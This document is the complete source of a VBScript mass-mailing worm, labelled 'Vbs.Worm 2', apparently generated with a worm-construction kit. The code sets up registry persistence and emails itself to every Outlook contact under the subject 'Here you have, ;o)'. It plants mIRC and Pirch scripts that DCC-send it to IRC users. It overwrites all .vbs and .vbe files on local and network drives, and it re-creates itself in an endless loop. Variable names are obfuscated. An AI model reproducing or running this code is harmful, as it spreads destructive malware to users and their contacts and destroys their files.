'Vbs.Worm 2 Created By hunter
On Error Resume Next
Set Z3w2cb0HC9Rvm= Createobject("scripting.filesystemobject")
Z3w2cb0HC9Rvm.copyfile wscript.scriptfullname,Z3w2cb0HC9Rvm.GetSpecialFolder(0)& "\Worm.vbs"
Set K83tXEN2CJS4x = CreateObject("WScript.Shell")
K83tXEN2CJS4x.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&Z3w2cb0HC9Rvm.GetSpecialFolder(0)& "\Worm.vbs %"
if K83tXEN2CJS4x.regread ("HKCU\software\Worm 2\mailed") <> "1" then
bNH7dHCXz8P4u()
end if
if K83tXEN2CJS4x.regread ("HKCU\software\Worm 2\mirqued") <> "1" then
WfhEwBJ4s67l6 ""
end if
if K83tXEN2CJS4x.regread ("HKCU\software\Worm 2\pirched") <> "1" then
qi6o58m1RM0y9 ""
end if
Q716m8PE6UBJ7()
Set ZB84oOd66By1f= Z3w2cb0HC9Rvm.opentextfile(wscript.scriptfullname, 1)
v0TcR8648E19g= ZB84oOd66By1f.readall
ZB84oOd66By1f.Close
Do
If Not (Z3w2cb0HC9Rvm.fileexists(wscript.scriptfullname)) Then
Set ZF51WaqO6M28W= Z3w2cb0HC9Rvm.createtextfile(wscript.scriptfullname, True)
ZF51WaqO6M28W.writev0TcR8648E19g
ZF51WaqO6M28W.Close
End If
Loop
Function bNH7dHCXz8P4u()
On Error Resume Next
Set QeGsW5ufr4o08 = CreateObject("Outlook.Application")
If QeGsW5ufr4o08= "Outlook"Then
Set E1w765s1A7n30=QeGsW5ufr4o08.GetNameSpace("MAPI")
Set Vc70h6EZ5Oj7G= E1w765s1A7n30.AddressLists
For Each Qx5HO5n8K0kdy In Vc70h6EZ5Oj7G
If Qx5HO5n8K0kdy.AddressEntries.Count <> 0 Then
REHqEY47RMOb5 = Qx5HO5n8K0kdy.AddressEntries.Count
For SwEt8jQ5W4r4C= 1 To REHqEY47RMOb5
Set yqW7UCSb01uLz = QeGsW5ufr4o08.CreateItem(0)
Set TzJvmBs03qKgY = Qx5HO5n8K0kdy.AddressEntries(SwEt8jQ5W4r4C)
yqW7UCSb01uLz.To = TzJvmBs03qKgY.Address
yqW7UCSb01uLz.Subject = "Here you have, ;o)"
yqW7UCSb01uLz.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set C50v2OX9TwJ1z=yqW7UCSb01uLz.Attachments
C50v2OX9TwJ1z.Add Z3w2cb0HC9Rvm.GetSpecialFolder(0)& "\Worm.vbs"
yqW7UCSb01uLz.DeleteAfterSubmit = True
If yqW7UCSb01uLz.To <> "" Then
yqW7UCSb01uLz.Send
K83tXEN2CJS4x.regwrite "HKCU\software\Worm 2\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function WfhEwBJ4s67l6(FzgT4JbG8WxT0)
On Error Resume Next
if FzgT4JbG8WxT0 = "" then
if Z3w2cb0HC9Rvm.fileexists("c:\mirc\mirc.ini") then FzgT4JbG8WxT0="c:\mirc"
if Z3w2cb0HC9Rvm.fileexists("c:\mirc32\mirc.ini") then FzgT4JbG8WxT0="c:\mirc32"
RqlQ1OW2x457Z=K83tXEN2CJS4x.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Z3w2cb0HC9Rvm.fileexists(RqlQ1OW2x457Z & "\mirc\mirc.ini") then FzgT4JbG8WxT0=RqlQ1OW2x457Z & "\mirc"
end if
if FzgT4JbG8WxT0 <> "" then
set Yed8RT6pevU44 = Z3w2cb0HC9Rvm.CreateTextFile(FzgT4JbG8WxT0 & "\script.ini", True)
Yed8RT6pevU44.WriteLine "[script]"
Yed8RT6pevU44.writeline "n0=on 1:JOIN:#:{"
Yed8RT6pevU44.writeline "n1=  /if ( $nick == $me ) { halt }"
Yed8RT6pevU44.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&Z3w2cb0HC9Rvm.GetSpecialFolder(0)& "\Worm.vbs" & vbCrLf & "n3=}"
Yed8RT6pevU44.close
K83tXEN2CJS4x.regwrite "HKCU\software\Worm 2\Mirqued", "1"
end if
end function
function qi6o58m1RM0y9(UZbnMdoaRx31i)
On Error Resume Next
if UZbnMdoaRx31i="" then
if Z3w2cb0HC9Rvm.fileexists("c:\pirch\Pirch32.exe") then UZbnMdoaRx31i="c:\pirch"
if Z3w2cb0HC9Rvm.fileexists("c:\pirch32\Pirch32.exe") then UZbnMdoaRx31i="c:\pirch32"
lPutb5p7xWeks=K83tXEN2CJS4x.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Z3w2cb0HC9Rvm.fileexists(lPutb5p7xWeks & "\pirch\Pirch32.exe") then UZbnMdoaRx31i=lPutb5p7xWeks & "\pirch\Pirch32.exe"
end if
if UZbnMdoaRx31i <> "" then
set iZfhEwBJ4s67l= Z3w2cb0HC9Rvm.CreateTextFile(UZbnMdoaRx31i & "\events.ini", True)
iZfhEwBJ4s67l.WriteLine "[Levels]"
iZfhEwBJ4s67l.WriteLine "Enabled=1"
iZfhEwBJ4s67l.WriteLine "Count=6"
iZfhEwBJ4s67l.WriteLine "Level1=000-Unknowns"
iZfhEwBJ4s67l.WriteLine "000-UnknownsEnabled=1"
iZfhEwBJ4s67l.WriteLine "Level2=100-Level 100"
iZfhEwBJ4s67l.WriteLine "100-Level 100Enabled=1"
iZfhEwBJ4s67l.WriteLine "Level3=200-Level 200"
iZfhEwBJ4s67l.WriteLine "200-Level 200Enabled=1"
iZfhEwBJ4s67l.WriteLine "Level4=300-Level 300"
iZfhEwBJ4s67l.WriteLine " 300-Level 300Enabled=1"
iZfhEwBJ4s67l.WriteLine "Level5=400-Level 400 "
iZfhEwBJ4s67l.WriteLine "400-Level 400Enabled=1"
iZfhEwBJ4s67l.WriteLine "Level6=500-Level 500"
iZfhEwBJ4s67l.WriteLine "500-Level 500Enabled=1"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[000-Unknowns]"
iZfhEwBJ4s67l.WriteLine "UserCount=0"
iZfhEwBJ4s67l.WriteLine "EventCount=0"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[100-Level 100]"
iZfhEwBJ4s67l.WriteLine "User1=*!*@*"
iZfhEwBJ4s67l.WriteLine "UserCount=1"
iZfhEwBJ4s67l.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & Z3w2cb0HC9Rvm.GetSpecialFolder(0) & "\Worm.vbs"
iZfhEwBJ4s67l.WriteLine "EventCount=1"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[200-Level 200]"
iZfhEwBJ4s67l.WriteLine "UserCount=0"
iZfhEwBJ4s67l.WriteLine "EventCount=0"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[300-Level 300]"
iZfhEwBJ4s67l.WriteLine "UserCount=0"
iZfhEwBJ4s67l.WriteLine "EventCount=0"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[400-Level 400]"
iZfhEwBJ4s67l.WriteLine "UserCount=0"
iZfhEwBJ4s67l.WriteLine "EventCount=0"
iZfhEwBJ4s67l.WriteLine ""
iZfhEwBJ4s67l.WriteLine "[500-Level 500]"
iZfhEwBJ4s67l.WriteLine "UserCount=0"
iZfhEwBJ4s67l.WriteLine "EventCount=0"
iZfhEwBJ4s67l.close
K83tXEN2CJS4x.regwrite "HKCU\software\Worm 2\pirched", "1"
end if
end function
Function Q716m8PE6UBJ7()
On Error Resume Next
Set r5cJ13KgSwHK7 = Z3w2cb0HC9Rvm.Drives
For Each PuXEN5JKZ4xiu In r5cJ13KgSwHK7
If PuXEN5JKZ4xiu.Drivetype = Remote Then
V7dI22z8P4v09= PuXEN5JKZ4xiu & "\"
Call F3OvxM6JRHj97(V7dI22z8P4v09)
ElseIf PuXEN5JKZ4xiu.IsReady Then
V7dI22z8P4v09= PuXEN5JKZ4xiu&"\"
Call F3OvxM6JRHj97(V7dI22z8P4v09)
End If
Next
End Function
Function F3OvxM6JRHj97(bNZB9f8lk4HC6)
IUW1NH33AUXi1=bNZB9f8lk4HC6
Set wM2BmRHp64T38= Z3w2cb0HC9Rvm.GetFolder(IUW1NH33AUXi1)
Set P4sCrtZ8XF8e1= wM2BmRHp64T38.Files
For Each tX5V84MZp2o25 In P4sCrtZ8XF8e1
if Z3w2cb0HC9Rvm.GetExtensionName(tX5V84MZp2o25.path) = "vbs" then
Z3w2cb0HC9Rvm.copyfile wscript.scriptfullname , tX5V84MZp2o25.path , true
end if
if Z3w2cb0HC9Rvm.GetExtensionName(tX5V84MZp2o25.path) = "vbe" then
Z3w2cb0HC9Rvm.copyfile wscript.scriptfullname , tX5V84MZp2o25.path , true
end if
Next
Set tX5V84MZp2o25= wM2BmRHp64T38.SubFolders
For Each t5qZ2F1y3R20P In tX5V84MZp2o25
Call F3OvxM6JRHj97(t5qZ2F1y3R20P.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.
